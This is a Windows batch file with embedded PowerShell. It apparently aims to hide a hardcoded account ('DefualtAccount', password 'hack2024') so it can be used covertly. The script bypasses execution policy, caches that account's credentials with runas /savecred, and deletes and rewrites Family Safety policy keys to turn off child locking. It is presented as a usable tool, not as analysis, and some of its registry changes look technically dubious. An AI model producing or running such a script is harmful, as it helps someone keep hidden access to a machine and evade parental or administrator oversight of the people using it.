@echo off
REM Hide DefualtAccount PERMANENTLY - NO ADMIN, default login unchanged
REM Username: DefualtAccount, Password: hack2024
REM PS bypass execution policy

powershell -ExecutionPolicy Bypass -Command ^
"$errAction = 'SilentlyContinue'; ^
Write-Host 'Hiding DefualtAccount from everywhere...' -ForegroundColor Green; ^
$users = net user | Select-String 'DefualtAccount' -Quiet; ^
if (-not $users) { Write-Host 'ERROR: DefualtAccount not found.' -ForegroundColor Red; Read-Host; exit 1 }; ^
Start-Process 'runas' -ArgumentList '/user:DefualtAccount /savecred \"cmd /k echo Hidden DefualtAccount ready!\"' -Wait; ^
$exp = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'; ^
if (-not (Test-Path $exp)) { New-Item $exp -Force }; ^
Set-ItemProperty $exp 'NoUserAdmins' 1; ^
$fsp = 'HKCU:\Software\Policies\Microsoft\Windows\FamilySafety'; ^
if (Test-Path $fsp) { Remove-Item $fsp -Recurse -Force }; ^
New-Item $fsp -Force | Out-Null; Set-ItemProperty $fsp 'LockForChild' 0; ^
Stop-Process -Name explorer -Force; Start-Sleep 3; Start-Process explorer; ^
Write-Host 'DefualtAccount HIDDEN! Win+R ^> runas /user:DefualtAccount cmd' -ForegroundColor Cyan; ^
Read-Host"

echo Done! Default boot unchanged.
pause
